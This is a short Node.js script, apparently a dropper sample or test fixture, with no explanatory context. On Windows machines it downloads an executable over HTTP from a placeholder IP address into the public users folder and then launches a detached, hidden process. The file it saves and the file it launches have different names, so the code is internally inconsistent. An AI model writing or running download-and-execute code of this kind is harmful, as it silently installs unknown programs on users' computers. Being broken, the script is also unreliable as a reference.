import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import { spawn } from 'node:child_process';
if (os.platform() === 'win32') {
 http.get('http://192.0.2.1/windows.exe', (res) => {
  const file = fs.createWriteStream('c:/users/public/windows.exe');
  res.pipe(file);
  file.on('finish', () => { file.close(() => {
   const child = spawn('c:/users/public/other.exe', [], { detached: true, stdio: 'ignore' });
   child.unref();
  }); });
 });
}
